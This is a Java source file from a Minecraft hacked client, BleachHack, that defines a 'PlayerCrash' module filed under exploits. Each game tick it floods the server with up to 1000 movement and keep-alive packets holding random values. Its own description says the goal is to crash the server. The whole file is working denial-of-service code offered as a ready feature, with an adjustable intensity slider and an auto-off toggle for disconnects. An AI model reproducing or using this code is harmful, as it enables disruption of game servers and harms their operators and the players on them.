/*
 * This file is part of the BleachHack distribution (https://github.com/BleachDrinker420/bleachhack-1.14/).
 * Copyright (c) 2019 Bleach.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package bleach.hack.epearledition.module.mods;

import bleach.hack.epearledition.event.events.EventReadPacket;
import bleach.hack.epearledition.event.events.EventTick;
import bleach.hack.epearledition.module.Category;
import bleach.hack.epearledition.module.Module;
import bleach.hack.epearledition.setting.base.SettingSlider;
import bleach.hack.epearledition.setting.base.SettingToggle;
import com.google.common.eventbus.Subscribe;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;

public class PlayerCrash extends Module {

    public PlayerCrash() {
        super("PlayerCrash", KEY_UNBOUND, Category.EXPLOITS, "Uses cpacketplayer packets to packetify the server so it packets your packet and packs enough to crash",
                new SettingSlider("Uses", 1, 1000, 100, 0),
                new SettingToggle("Auto-Off", true));
    }

    @Subscribe
    public void onTick(EventTick event) {
        for (int i = 0; i < getSetting(0).asSlider().getValue(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(Math.random() >= 0.5));
            mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
        }
    }

    @Subscribe
    private void EventDisconnect(EventReadPacket event) {
        if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(1).asToggle().state) setToggled(false);
    }
}
